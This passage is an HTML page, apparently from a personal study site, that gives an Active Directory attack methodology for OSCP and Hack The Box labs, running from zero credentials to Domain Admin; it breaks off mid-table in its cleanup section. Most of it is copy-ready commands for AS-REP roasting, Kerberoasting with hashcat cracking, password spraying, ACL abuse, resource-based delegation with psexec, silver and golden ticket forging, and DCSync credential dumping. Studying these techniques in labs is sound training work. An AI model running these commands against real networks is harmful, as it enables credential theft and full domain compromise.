@@ -1,0 +1,682 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>Active Directory Methodology — Corey Clay</title>
+<meta name="description" content="The AD attack path from zero credentials to Domain Admin — unauth recon, BloodHound-driven ACL abuse, Kerberoasting, delegation, and domain dominance ">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@400;500;600;700&family=Newsreader:ital,opsz,wght@0,6..72,400;0,6..72,500;1,6..72,400&family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet">
+<style>
+  :root{
+    --ink:#14161b;--ink-2:#181b21;--panel:#1c2027;--panel-2:#20242c;
+    --line:#2c313b;--line-soft:#242932;
+    --fg:#e6e2d8;--fg-dim:#b7b6ae;--muted:#868c98;--muted-2:#5f6672;
+    --signal:#e8a33d;--signal-soft:rgba(232,163,61,.14);--signal-line:rgba(232,163,61,.34);
+    --green:#7fae7a;--red:#d17a6e;--blue:#7fa6c9;
+    --f-display:"Space Grotesk",system-ui,sans-serif;
+    --f-body:"Newsreader",Georgia,serif;
+    --f-mono:"JetBrains Mono",ui-monospace,"SF Mono",Menlo,monospace;
+    box-sizing:border-box;padding-top:env(safe-area-inset-top,0px);padding-bottom:env(safe-area-inset-bottom,0px);
+  }
+  *,*::before,*::after{box-sizing:border-box}
+  html{scroll-behavior:smooth;scroll-padding-top:calc(126px + env(safe-area-inset-top,0px))}
+  @media (prefers-reduced-motion:reduce){html{scroll-behavior:auto}}
+  body{margin:0;background:var(--ink);color:var(--fg);font-family:var(--f-body);font-size:17px;line-height:1.6;
+    -webkit-font-smoothing:antialiased;text-rendering:optimizeLegibility;
+    background-image:
+      radial-gradient(1100px 520px at 82% -8%, rgba(232,163,61,.05), transparent 60%),
+      linear-gradient(var(--line-soft) 1px, transparent 1px),
+      linear-gradient(90deg, var(--line-soft) 1px, transparent 1px);
+    background-size:auto,64px 64px,64px 64px;background-position:0 0,-1px -1px,-1px -1px;}
+  .grid-fade{position:fixed;inset:0;pointer-events:none;z-index:0;background:linear-gradient(180deg,transparent 0%,var(--ink) 42%)}
+  a{color:inherit;text-decoration:none}
+  ::selection{background:var(--signal-soft);color:var(--fg)}
+  .wrap{max-width:900px;margin:0 auto;padding:0 24px;position:relative;z-index:1}
+
+  header.site{position:sticky;top:0;z-index:50;background:rgba(20,22,27,.86);backdrop-filter:blur(10px);
+    border-bottom:1px solid var(--line-soft);padding-top:env(safe-area-inset-top,0px)}
+  .bar{display:flex;align-items:center;justify-content:space-between;height:64px;max-width:900px;margin:0 auto;padding:0 24px}
+  .brand{display:flex;align-items:center;gap:11px;font-family:var(--f-mono);font-size:14px;letter-spacing:.02em}
+  .brand .dot{width:9px;height:9px;border-radius:50%;background:var(--signal);box-shadow:0 0 0 3px var(--signal-soft);flex:none}
+  .brand b{color:var(--fg);font-weight:700}
+  .brand span{color:var(--muted)}
+  nav.top{display:flex;gap:24px;font-family:var(--f-mono);font-size:13px;color:var(--muted)}
+  nav.top a{transition:color .18s ease}
+  nav.top a:hover,nav.top a.here{color:var(--signal)}
+  nav.top a:focus-visible,.brand:focus-visible{outline:2px solid var(--signal);outline-offset:4px;border-radius:2px}
+  @media (max-width:680px){nav.top a:not(.here):not(.home){display:none}}
+
+  .cs-hero{padding:56px 0 22px}
+  .cs-hero .kicker{font-family:var(--f-mono);font-size:12.5px;color:var(--signal);margin:0 0 10px}
+  .cs-hero .kicker a{color:var(--muted)}
+  .cs-hero .kicker a:hover{color:var(--signal)}
+  .cs-hero h1{font-family:var(--f-display);font-weight:600;font-size:clamp(30px,5vw,46px);letter-spacing:-.02em;
+    line-height:1.05;margin:0 0 14px;color:var(--fg)}
+  .cs-hero p{max-width:64ch;color:var(--fg-dim);font-size:18px;margin:0}
+
+  .sec-nav{position:sticky;top:64px;z-index:40;background:rgba(20,22,27,.92);backdrop-filter:blur(8px);
+    border-bottom:1px solid var(--line-soft);padding:11px 0}
+  .sec-nav .inner{display:flex;gap:7px;overflow-x:auto;scrollbar-width:none;max-width:900px;margin:0 auto;padding:0 24px}
+  .sec-nav .inner::-webkit-scrollbar{display:none}
+  .sec-nav a{font-family:var(--f-mono);font-size:11.5px;color:var(--muted);white-space:nowrap;
+    padding:5px 11px;border:1px solid var(--line);border-radius:20px;transition:.16s;flex:none}
+  .sec-nav a:hover,.sec-nav a:focus-visible{color:var(--signal);border-color:var(--signal-line)}
+  .sec-nav a.here{color:var(--signal);border-color:var(--signal-line);background:var(--signal-soft)}
+  .sec-nav a:focus-visible{outline:2px solid var(--signal);outline-offset:2px}
+
+  main{padding:12px 0 40px}
+  main h2{font-family:var(--f-display);font-weight:600;font-size:clamp(23px,3.2vw,30px);letter-spacing:-.01em;
+    color:var(--fg);margin:56px 0 8px;padding-top:20px;border-top:1px solid var(--line-soft);scroll-margin-top:130px}
+  main h2:first-of-type{border-top:0;margin-top:20px}
+  main h3{font-family:var(--f-display);font-weight:500;font-size:19px;color:var(--fg);margin:30px 0 10px}
+  main h4{font-family:var(--f-mono);font-size:14px;color:var(--signal);margin:22px 0 8px;letter-spacing:.01em}
+  main p{color:var(--fg-dim);margin:0 0 16px;max-width:74ch}
+  main strong{color:var(--fg);font-weight:600}
+  main a{color:var(--signal)}
+  main a:hover{text-decoration:underline}
+  main ul,main ol{color:var(--fg-dim);margin:0 0 18px;padding-left:22px;max-width:74ch}
+  main li{margin-bottom:6px}
+  main ul li::marker{color:var(--signal)}
+  main hr{border:0;border-top:1px solid var(--line-soft);margin:8px 0}
+
+  .code-wrap{position:relative;margin:0 0 18px}
+  main pre{background:var(--ink-2);border:1px solid var(--line);border-radius:8px;overflow-x:auto;
+    margin:0;padding:15px 17px;font-family:var(--f-mono);font-size:13px;line-height:1.7;color:var(--fg-dim)}
+  main pre code{font-family:var(--f-mono);background:none;padding:0;color:inherit;white-space:pre}
+  main :not(pre) > code{font-family:var(--f-mono);font-size:.86em;background:var(--panel-2);
+    border:1px solid var(--line-soft);border-radius:5px;padding:1px 6px;color:var(--signal)}
+  .copy{position:absolute;top:8px;right:8px;font-family:var(--f-mono);font-size:11px;color:var(--muted);
+    background:var(--panel);border:1px solid var(--line);border-radius:6px;padding:4px 10px;cursor:pointer;transition:.15s;opacity:.85}
+  .copy:hover,.copy:focus-visible{color:var(--signal);border-color:var(--signal-line);opacity:1}
+  .copy:focus-visible{outline:2px solid var(--signal);outline-offset:2px}
+  .copy.done{color:var(--green);border-color:rgba(127,174,122,.4)}
+
+  .table-scroll{overflow-x:auto;margin:0 0 20px;border:1px solid var(--line-soft);border-radius:8px}
+  main table{border-collapse:collapse;width:100%;font-size:14px;min-width:520px}
+  main th{font-family:var(--f-mono);font-size:12px;text-align:left;color:var(--signal);
+    background:var(--panel-2);padding:10px 14px;border-bottom:1px solid var(--line);font-weight:500;white-space:nowrap}
+  main td{padding:10px 14px;border-bottom:1px solid var(--line-soft);color:var(--fg-dim);vertical-align:top}
+  main tr:last-child td{border-bottom:0}
+  main td code{white-space:nowrap}
+
+  footer.site{border-top:1px solid var(--line-soft);padding:44px 0 60px;margin-top:40px}
+  .foot{display:flex;flex-wrap:wrap;justify-content:space-between;gap:20px;align-items:center}
+  .foot .f-brand{font-family:var(--f-mono);font-size:13px;color:var(--muted)}
+  .foot .f-brand b{color:var(--fg)}
+  .foot-links{display:flex;gap:22px;font-family:var(--f-mono);font-size:13px}
+  .foot-links a{color:var(--muted);transition:color .16s}
+  .foot-links a:hover,.foot-links a:focus-visible{color:var(--signal)}
+  .disclaimer{font-family:var(--f-mono);font-size:11.5px;color:var(--muted-2);margin:30px 0 0;max-width:74ch;line-height:1.7;
+    border-left:2px solid var(--line);padding-left:16px}
+</style>
+</head>
+<body>
+<div class="grid-fade" aria-hidden="true"></div>
+
+<header class="site" id="top">
+  <div class="bar">
+    <a class="brand" href="index.html" aria-label="Home">
+      <span class="dot" aria-hidden="true"></span><b>corey.clay</b><span>/ active-directory</span>
+    </a>
+    <nav class="top" aria-label="Primary">
+      <a class="home" href="index.html">home</a>
+      <a href="index.html#log">log</a>
+      <a class="here" href="methodology.html" aria-current="page">methodology</a>
+      <a class="" href="enumeration.html">enumeration</a>
+      <a href="https://www.linkedin.com/in/corey-clay-664943b8/" target="_blank" rel="noopener">linkedin</a>
+    </nav>
+  </div>
+</header>
+
+<div class="cs-hero wrap">
+  <p class="kicker"><a href="methodology.html">&larr; methodology</a> &nbsp;/&nbsp; zero to domain admin</p>
+  <h1>Active Directory methodology</h1>
+  <p>The AD attack path from zero credentials to Domain Admin — unauth recon, BloodHound-driven ACL abuse, Kerberoasting, delegation, and domain dominance — ordered by what actually works in the labs.</p>
+</div>
+
+<nav class="sec-nav" aria-label="Jump to section">
+  <div class="inner">
+      <a href="#prime-rules">Prime Rules</a>
+      <a href="#dc-identification-signature">DC Identification Signature</a>
+      <a href="#the-distilled-methodology">The Distilled Methodology</a>
+      <a href="#frequency-ranked-ad-attack-vectors-htb-cpts-pg-evidence">Frequency-Ranked AD Attack Vectors (HTB CPTS + PG Evidence)</a>
+      <a href="#the-attack-chain-canonical-order">The Attack Chain — Canonical Order</a>
+      <a href="#decision-tree-i-see-x-try-y">Decision Tree — &quot;I See X, Try Y&quot;</a>
+      <a href="#kerberos-clock-skew-fix-krb-ap-err-skew">Kerberos Clock-Skew Fix (KRB_AP_ERR_SKEW)</a>
+      <a href="#key-exam-ready-one-liners">Key Exam-Ready One-Liners</a>
+      <a href="#opsec-cleanup-mandatory-for-oscp-report-quality">OpSec + Cleanup (Mandatory for OSCP Report Quality)</a>
+      <a href="#exam-restrictions">EXAM Restrictions</a>
+      <a href="#exam-day-ad-checklist">EXAM-Day AD Checklist</a>
+  </div>
+</nav>
+<main class="wrap">
+<p>AD attack path from zero creds -&gt; Domain Admin. Ordered by what actually worked across HTB CPTS + PG Practice AD boxes.</p>
+<h2 id="prime-rules">Prime Rules</h2>
+<ol>
+<li><strong>Enumerate before you exploit.</strong> Every AD box has a specific weak-cred / ACL / delegation path — find it before running exploits.</li>
+<li><strong>BloodHound is your map</strong> — collect early with any working cred, re-collect after every credential gain.</li>
+<li><strong>Password reuse across every user, every service, every box</strong> — highest-ROI move in AD.</li>
+<li><strong>Timing matters</strong> — Kerberos rejects tickets outside the 5-minute skew window. <code>sudo ntpdate &lt;DC_IP&gt;</code> before every ticket op.</li>
+<li><strong>Cleanup is mandatory</strong> — every SPN plant, every group add, every RBCD delegation must be reverted for OpSec (and OSCP report quality).</li>
+<li><strong>Responder poisoning is EXAM-BANNED</strong> — only analyse-only <code>-A</code> is EXAM-OK for LLMNR observation.</li>
+</ol>
+<hr />
+<h2 id="dc-identification-signature">DC Identification Signature</h2>
+<p>Open port set that says "this is a DC":</p>
+<ul>
+<li><strong>88</strong> — Kerberos</li>
+<li><strong>389</strong> — LDAP</li>
+<li><strong>636</strong> — LDAPS</li>
+<li><strong>464</strong> — kpasswd</li>
+<li><strong>593</strong> — RPC-over-HTTP</li>
+<li><strong>3268 / 3269</strong> — GC / GC-SSL (present on DCs that host the Global Catalog role)</li>
+<li><strong>445</strong> — SMB (always)</li>
+<li><strong>5985</strong> — WinRM (usually)</li>
+</ul>
+<hr />
+<h2 id="the-distilled-methodology">The Distilled Methodology</h2>
+<h3>Phase A — Unauthenticated Recon</h3>
+<pre><code class="language-bash"># 1. Broad enum from zero:
+enum4linux-ng -A &lt;DC_IP&gt;                                   # SAMR works even when LDAP anon denied — Resourced
+nxc smb &lt;DC_IP&gt; -u '' -p '' --shares
+nxc smb &lt;DC_IP&gt; -u '' -p '' --rid-brute                    # baseline
+nxc smb &lt;DC_IP&gt; -u 'guest' -p '' --rid-brute               # guest fallback (Vault)
+
+# 2. Anonymous LDAP:
+ldapsearch -x -H ldap://&lt;DC_IP&gt; -b '' -s base namingContexts
+ldapsearch -x -H ldap://&lt;DC_IP&gt; -b &quot;DC=&lt;DOMAIN&gt;,DC=local&quot; '(objectClass=user)' \
+  sAMAccountName description info | grep -iE &quot;sAMAccountName|description|info&quot;
+
+# 3. Kerberos: AS-REP roast without creds
+impacket-GetNPUsers &lt;DOMAIN&gt;/&lt;USER&gt; -dc-ip &lt;DC_IP&gt; -no-pass -format hashcat
+# -&gt; hashcat -m 18200 &lt;hash&gt; &lt;WORDLIST&gt;
+
+# 4. Password policy (need one cred usually):
+nxc smb &lt;DC_IP&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' --pass-pol            # threshold determines safe spray
+
+# 5. Kerbrute (pre-auth, no lockout risk):
+username-anarchy --input-file names.txt &gt; users.txt         # web-scraped names -&gt; permutations
+kerbrute userenum -d &lt;DOMAIN&gt; --dc &lt;DC_IP&gt; users.txt -o valid.txt
+</code></pre>
+<h3>Phase B — First Credential -&gt; BloodHound</h3>
+<pre><code class="language-bash"># BloodHound-CE (v5+):
+bloodhound-ce-python -u &lt;USER&gt; -p '&lt;PASS&gt;' -d &lt;DOMAIN&gt; -ns &lt;DC_IP&gt; -c All --zip
+
+# Classic BloodHound:
+bloodhound-python -u &lt;USER&gt; -p '&lt;PASS&gt;' -d &lt;DOMAIN&gt; -ns &lt;DC_IP&gt; -c All --zip
+
+# From Windows:
+SharpHound.exe -c All
+</code></pre>
+<p><strong>Immediate BloodHound queries:</strong></p>
+<ul>
+<li><code>Find AS-REP Roastable Users</code> -&gt; set them roastable via <code>GenericWrite</code> if you have ACL</li>
+<li><code>Find Kerberoastable Users</code> -&gt; <code>impacket-GetUserSPNs</code></li>
+<li><code>Shortest paths from Owned to Domain Admins</code></li>
+<li>Mark every compromised account as <strong>Owned</strong></li>
+</ul>
+<h3>Phase C — Credential Harvesting</h3>
+<pre><code class="language-bash"># LAPS ExtendedRight?
+nxc ldap &lt;DC_IP&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' -M laps            # Hutch
+ldapsearch -x -H ldap://&lt;DC_IP&gt; -D &quot;&lt;USER&gt;@&lt;DOMAIN&gt;&quot; -w '&lt;PASS&gt;' \
+  -b &quot;DC=&lt;DOMAIN&gt;,DC=local&quot; &quot;(ms-Mcs-AdmPwd=*)&quot; ms-Mcs-AdmPwd sAMAccountName
+
+# Description fields:
+Get-DomainUser * | select samaccountname,description | ?{$_.Description -ne $null}
+
+# gMSA managed passwords (need ReadGMSAPassword):
+gMSADumper.py -u &lt;USER&gt; -p '&lt;PASS&gt;' -d &lt;DOMAIN&gt;
+
+# Mailboxes (post-Linux-foothold on any DC-member Linux host):
+cat /var/mail/*                                        # colleagues share creds by email
+</code></pre>
+<h3>Phase D — Match Findings Against Ranked Table</h3>
+<hr />
+<h2 id="frequency-ranked-ad-attack-vectors-htb-cpts-pg-evidence">Frequency-Ranked AD Attack Vectors (HTB CPTS + PG Evidence)</h2>
+<table>
+<thead>
+<tr>
+<th>Rank</th>
+<th>Vector</th>
+<th>Evidence boxes</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1</td>
+<td><strong>Password reuse</strong> — every cred against every user via <code>su</code> / <code>ssh</code> / <code>nxc smb -u X -p Y</code></td>
+<td>Almost every AD box</td>
+</tr>
+<tr>
+<td>2</td>
+<td><strong>Kerberoast</strong> — service accounts with SPNs — offline crack</td>
+<td>authority, blackfield, redelegate, vintage, voleur, vulncicada, Nagoya (chained via silver ticket)</td>
+</tr>
+<tr>
+<td>3</td>
+<td><strong>AS-REP roast</strong> — users with <code>DONT_REQ_PREAUTH</code></td>
+<td>vintage, voleur (used to seed initial cred)</td>
+</tr>
+<tr>
+<td>4</td>
+<td><strong>BloodHound -&gt; ACL abuse chain</strong> — ForceChangePassword / GenericAll / GenericWrite / WriteDACL / WriteOwner</td>
+<td>administrator, blackfield, fluffy, redelegate, streamio, tombwatcher, vintage, Hutch (via LAPS), Nagoya (GenericAll chain)</td>
+</tr>
+<tr>
+<td>5</td>
+<td><strong>LAPS ExtendedRight -&gt; cleartext local admin</strong></td>
+<td>Hutch</td>
+</tr>
+<tr>
+<td>6</td>
+<td><strong>RBCD</strong> (Resource-Based Constrained Delegation) — <code>GenericAll</code> on DC computer object -&gt; <code>addcomputer</code> + <code>rbcd write</code> + <code>getST -impersonate</code></td>
+<td>Resourced, redelegate</td>
+</tr>
+<tr>
+<td>7</td>
+<td><strong>ADCS ESC1-15</strong> — vulnerable cert templates</td>
+<td>authority (ESC1), various</td>
+</tr>
+<tr>
+<td>8</td>
+<td><strong>Silver ticket</strong> — offline forgery with service NT hash + SPN</td>
+<td>Nagoya (<code>svc_mssql</code> -&gt; <code>MSSQL/DC_FQDN</code> -&gt; impersonate Administrator)</td>
+</tr>
+<tr>
+<td>9</td>
+<td><strong>Golden ticket / child-&gt;parent SID history</strong> — from <code>krbtgt</code> of child domain</td>
+<td>Trust attack (CPTS)</td>
+</tr>
+<tr>
+<td>10</td>
+<td><strong>NTLM relay</strong> to LDAP/SMB/HTTP — restricted on OSCP (poisoning banned), but relaying <strong>captured</strong> hashes is analyse-fine</td>
+<td>(rare on OSCP)</td>
+</tr>
+<tr>
+<td>11</td>
+<td><strong>NTDS backup share</strong> — <code>Active Directory/</code> + <code>registry/</code> folders = ntdsutil IFM dump</td>
+<td>Resourced</td>
+</tr>
+<tr>
+<td>12</td>
+<td><strong>GPO / GPP <code>cpassword</code> on SYSVOL</strong> — legacy but still on some boxes</td>
+<td>(legacy CPTS labs)</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="the-attack-chain-canonical-order">The Attack Chain — Canonical Order</h2>
+<pre><code>Zero creds
+   |
+enum4linux-ng / SAMR RID brute / anon LDAP -&gt; user list
+   |
+kerbrute userenum -&gt; valid usernames
+   |
+AS-REP roast (no-preauth users) OR spray weak/default passwords OR LAPS (if ExtendedRight) OR anon share cred leak
+   |
+FIRST CREDENTIAL
+   |
+BloodHound collection (bloodhound-ce-python -c All)
+   |
+Description / info field grep, LAPS check, gMSA dump, mailbox reads
+   |
+Kerberoast (offline crack) OR ACL abuse (ForceChangePassword / GenericAll)
+   |
+BloodHound path to next principal
+   |
+Lateral: PtH via nxc smb, PtT via kinit ccache, WinRM (evil-winrm), PsExec (impacket)
+   |
+BloodHound recollect — mark every new cred as Owned
+   |
+Path to DA revealed (usually via DCSync ExtendedRight -&gt; secretsdump)
+   |
+DA
+   |
+DCSync krbtgt -&gt; golden ticket for persistence (mandatory cleanup)
+</code></pre>
+<hr />
+<h2 id="decision-tree-i-see-x-try-y">Decision Tree — "I See X, Try Y"</h2>
+<table>
+<thead>
+<tr>
+<th>Observation</th>
+<th>Response</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>anon SMB rejects null session</td>
+<td><code>nxc smb -u guest -p '' --rid-brute</code> (Vault)</td>
+</tr>
+<tr>
+<td>anon LDAP responds but returns nothing on user objects</td>
+<td>Try <code>-s base namingContexts</code> + SAMR RID brute fallback (Resourced)</td>
+</tr>
+<tr>
+<td>AS-REP roast returns "doesn't have UF_DONT_REQUIRE_PREAUTH set" for every user</td>
+<td>Rule out AS-REP roast; move on</td>
+</tr>
+<tr>
+<td><code>nxc smb &lt;DC_IP&gt; -u X -p Y</code> returns <code>Pwn3d!</code></td>
+<td>Local admin! -&gt; <code>nxc smb -x</code> for commands, or <code>impacket-psexec</code> for shell</td>
+</tr>
+<tr>
+<td>BloodHound edge <code>GenericAll</code> on DC computer object</td>
+<td>RBCD chain (Resourced)</td>
+</tr>
+<tr>
+<td>BloodHound edge <code>WriteOwner</code> on user</td>
+<td>Set owner, <code>dsacls</code> add <code>GenericAll</code>, ForceChangePassword</td>
+</tr>
+<tr>
+<td>BloodHound edge <code>ForceChangePassword</code></td>
+<td><code>net rpc password</code> (Nagoya) — no cleanup needed if the account is a service/lab one</td>
+</tr>
+<tr>
+<td>BloodHound edge <code>GenericWrite</code> on user</td>
+<td>Targeted Kerberoast: plant fake SPN -&gt; GetUserSPNs -&gt; crack -&gt; clear SPN</td>
+</tr>
+<tr>
+<td>BloodHound edge <code>AddMember</code> to a privileged group</td>
+<td>Add self -&gt; auth as that group -&gt; remove self (mandatory cleanup)</td>
+</tr>
+<tr>
+<td>BloodHound edge <code>AllowedToDelegate</code> (unconstrained delegation)</td>
+<td>Trigger authentication via PrinterBug / spooler, capture TGT</td>
+</tr>
+<tr>
+<td>BloodHound edge <code>DCSync</code></td>
+<td><code>impacket-secretsdump -just-dc-ntlm &lt;DOMAIN&gt;/&lt;USER&gt;@&lt;DC_IP&gt;</code></td>
+</tr>
+<tr>
+<td>User in local <code>Backup Operators</code></td>
+<td><code>reg save HKLM\SAM</code> + <code>HKLM\SYSTEM</code> -&gt; <code>secretsdump LOCAL</code></td>
+</tr>
+<tr>
+<td><code>gMSADumper</code> reveals gMSA managed password</td>
+<td>PtH the machine hash -&gt; any service that trusts the gMSA</td>
+</tr>
+<tr>
+<td>LAPS <code>ms-Mcs-AdmPwd</code> readable</td>
+<td>Cleartext local admin — SMB in with <code>-u administrator</code></td>
+</tr>
+<tr>
+<td>Description field contains cred-shaped string</td>
+<td>Try it directly and spray as <code>su</code> / <code>nxc</code> (any-user, any-service)</td>
+</tr>
+<tr>
+<td>Mailboxes accessible</td>
+<td><code>cat /var/mail/*</code> — colleagues share creds</td>
+</tr>
+<tr>
+<td><code>svc_mssql</code> NT hash + MSSQL SPN visible</td>
+<td>Silver ticket -&gt; impersonate Administrator on MSSQL (Nagoya)</td>
+</tr>
+<tr>
+<td>Cert template with <code>EnrolleeSuppliesSubject=1</code> + auth on target</td>
+<td>ESC1 -&gt; certipy req + auth</td>
+</tr>
+<tr>
+<td>NTDS backup share present</td>
+<td><code>Active Directory/</code> + <code>registry/</code> folders -&gt; offline <code>secretsdump -ntds LOCAL</code></td>
+</tr>
+<tr>
+<td><code>KRB_AP_ERR_SKEW</code> / "Clock skew too great" on any Kerberos request</td>
+<td>Kali clock is &gt;5 min off the DC. Read the DC's clock, then send the request with matching wall-clock time via <code>faketime</code> — see next section.</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="kerberos-clock-skew-fix-krb-ap-err-skew">Kerberos Clock-Skew Fix (KRB_AP_ERR_SKEW)</h2>
+<p>Kerberos rejects tickets more than five minutes off the KDC's clock. When you pivot through a SOCKS proxy (proxychains), <code>ntpdate</code> from Kali won't help — you need to trick just the impacket call.</p>
+<pre><code class="language-bash"># Read the domain controller's current time (over SMB, works via proxychains too)
+proxychains -q net time -S &lt;DC_IP&gt;
+# Sun Oct 15 08:47:03 UTC 2023   &lt;-- note this value
+
+# Re-issue the impacket command with faketime pinned to the DC clock
+faketime 'YYYY-MM-DD HH:MM:SS' proxychains -q impacket-GetUserSPNs -request -dc-ip &lt;DC_IP&gt; &lt;DOMAIN&gt;/&lt;USER&gt;
+faketime '2023-10-15 08:47:03'  proxychains -q impacket-GetNPUsers   -no-pass -dc-ip &lt;DC_IP&gt; &lt;DOMAIN&gt;/ -usersfile users.txt
+</code></pre>
+<p>If <code>faketime</code> isn't installed: <code>sudo apt install faketime</code>.</p>
+<p><strong>When to use:</strong> any impacket command that talks Kerberos (<code>GetUserSPNs</code>, <code>GetNPUsers</code>, <code>getST</code>, <code>secretsdump -k</code>, <code>psexec -k</code>) failing with skew errors. <code>chrony</code> / <code>ntpdate</code> on the whole Kali box also works but requires root and touches the host clock — <code>faketime</code> is per-command and doesn't.</p>
+<hr />
+<h2 id="key-exam-ready-one-liners">Key Exam-Ready One-Liners</h2>
+<h3>Enumeration (unauth -&gt; cred)</h3>
+<pre><code class="language-bash">enum4linux-ng -A &lt;DC_IP&gt;
+nxc smb &lt;DC_IP&gt; -u '' -p '' --shares --rid-brute
+nxc smb &lt;DC_IP&gt; -u guest -p '' --rid-brute
+
+# AS-REP roast for all users at once
+impacket-GetNPUsers &lt;DOMAIN&gt;/ -dc-ip &lt;DC_IP&gt; -usersfile users.txt -no-pass -format hashcat -outputfile asrep.hash
+hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt
+
+# Kerbrute
+kerbrute userenum -d &lt;DOMAIN&gt; --dc &lt;DC_IP&gt; users.txt
+kerbrute passwordspray -d &lt;DOMAIN&gt; --dc &lt;DC_IP&gt; users.txt Summer2024!
+#   1 password x N users = 1 lockout tick per user (safer than N passwords x 1 user)
+
+# BloodHound (needs one cred):
+bloodhound-ce-python -u &lt;USER&gt; -p '&lt;PASS&gt;' -d &lt;DOMAIN&gt; -ns &lt;DC_IP&gt; -c All --zip
+
+# LAPS:
+nxc ldap &lt;DC_IP&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' -M laps
+</code></pre>
+<h3>Kerberoast (Need One Cred)</h3>
+<pre><code class="language-bash">impacket-GetUserSPNs &lt;DOMAIN&gt;/&lt;USER&gt;:'&lt;PASS&gt;' -dc-ip &lt;DC_IP&gt; -request -outputfile spn.hash
+hashcat -m 13100 spn.hash /usr/share/wordlists/rockyou.txt
+
+# From Windows (Rubeus):
+Rubeus.exe kerberoast /outfile:hashes.txt /nowrap
+</code></pre>
+<h3>ACL Abuse Chain (BloodHound -&gt; Path)</h3>
+<pre><code class="language-bash"># ForceChangePassword:
+net rpc password &quot;&lt;TARGET_USER&gt;&quot; 'Nagoya@Winter24!' -U &quot;&lt;DOMAIN&gt;/&lt;USER&gt;%&lt;PASS&gt;&quot; -S &lt;DC_IP&gt;
+
+# GenericAll -&gt; add self to group:
+bloodyAD --host &lt;DC_IP&gt; -d &lt;DOMAIN&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' add groupMember 'Server Admins' &lt;USER&gt;
+
+# CLEANUP MANDATORY:
+bloodyAD --host &lt;DC_IP&gt; -d &lt;DOMAIN&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' remove groupMember 'Server Admins' &lt;USER&gt;
+</code></pre>
+<h3>RBCD (Resource-Based Constrained Delegation)</h3>
+<pre><code class="language-bash">sudo ntpdate &lt;DC_IP&gt;
+
+# 1. Add attacker-controlled machine account
+impacket-addcomputer &lt;DOMAIN&gt;/&lt;USER&gt; -hashes :&lt;NT&gt; -computer-name 'EVIL$' -computer-pass 'Passw0rd!' -dc-ip &lt;DC_IP&gt;
+
+# 2. Write RBCD ACL — delegate FROM EVIL$ TO the target
+impacket-rbcd &lt;DOMAIN&gt;/&lt;USER&gt; -hashes :&lt;NT&gt; -delegate-from 'EVIL$' -delegate-to '&lt;TARGET&gt;$' -action write -dc-ip &lt;DC_IP&gt;
+
+# 3. Request service ticket impersonating Administrator
+impacket-getST &lt;DOMAIN&gt;/'EVIL$':'Passw0rd!' -spn cifs/&lt;TARGET_FQDN&gt; -impersonate Administrator -dc-ip &lt;DC_IP&gt;
+export KRB5CCNAME=$PWD/Administrator@cifs_&lt;TARGET_FQDN&gt;@&lt;DOMAIN&gt;.ccache
+
+# 4. Access target
+impacket-psexec -k -no-pass &lt;TARGET_FQDN&gt;
+
+# CLEANUP:
+impacket-rbcd &lt;DOMAIN&gt;/&lt;USER&gt; -hashes :&lt;NT&gt; -delegate-to '&lt;TARGET&gt;$' -action flush -dc-ip &lt;DC_IP&gt;
+impacket-addcomputer &lt;DOMAIN&gt;/&lt;USER&gt; -hashes :&lt;NT&gt; -computer-name 'EVIL$' -action del -dc-ip &lt;DC_IP&gt;
+</code></pre>
+<h3>Silver Ticket (MSSQL Example — Nagoya)</h3>
+<pre><code class="language-bash">sudo ntpdate &lt;DC_IP&gt;
+impacket-ticketer -nthash &lt;svc_mssql_NT&gt; -domain-sid S-1-5-21-... -domain &lt;DOMAIN&gt; -spn MSSQL/&lt;DC_FQDN&gt; administrator
+export KRB5CCNAME=$PWD/administrator.ccache
+
+# SPN must resolve to the tunneled 1433 endpoint:
+echo &quot;127.0.0.1 &lt;DC_FQDN&gt;&quot; | sudo tee -a /etc/hosts
+impacket-mssqlclient -k &lt;DC_FQDN&gt;
+</code></pre>
+<h3>Golden Ticket (Post-DA)</h3>
+<pre><code class="language-bash"># On DC via lsadump / secretsdump:
+impacket-secretsdump -just-dc-user krbtgt &lt;DOMAIN&gt;/Administrator@&lt;DC_IP&gt;
+
+# Then forge:
+impacket-ticketer -nthash &lt;krbtgt_NT&gt; -domain-sid &lt;DOMSID&gt; -domain &lt;DOMAIN&gt; Administrator
+</code></pre>
+<h3>DA — The Final Move</h3>
+<pre><code class="language-bash"># DCSync via ExtendedRight on domain root:
+impacket-secretsdump -just-dc-ntlm &lt;DOMAIN&gt;/&lt;USER&gt;:'&lt;PASS&gt;'@&lt;DC_IP&gt;
+# -&gt; NT hash of Administrator + krbtgt -&gt; own the domain
+</code></pre>
+<h3>Cross-Domain (Trust Attacks)</h3>
+<p>Extra-SID + child-krbtgt = golden ticket that traverses the trust.</p>
+<hr />
+<h2 id="opsec-cleanup-mandatory-for-oscp-report-quality">OpSec + Cleanup (Mandatory for OSCP Report Quality)</h2>
+<p>Every step above requires a specific undo:</p>
+<table>
+<thead>
+<tr>
+<th>Action</th>
+<th>Undo</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Added a SPN</td>
+<td><code>Set-DomainObject -Credential $creds -Identity victim -Clear serviceprincipalname</code></td>
+</tr>
+<tr>
+<td>Added self to a group</td>
+<td><code>Remove-DomainGroupMember -Identity $group -Members $user</code></td>
+</tr>
+<tr>
+<td>Reset a user's password</td>
+<td>Coordinate with client / note in report</td>
+</tr>
+<tr>
+<td>RBCD write</td>
+<td><code>impacket-rbcd -action flush</code></td>
+</tr>
+<tr>
+<td>Machine account added</td>
+<td><code>impacket-addcomputer -action del</code></td>
+</tr>
+<tr>
+<td>Certificate enrolled</td>
+<td>Mark for revocation</td>
+</tr>
+<tr>
+<td>Golden ticket forged</td>
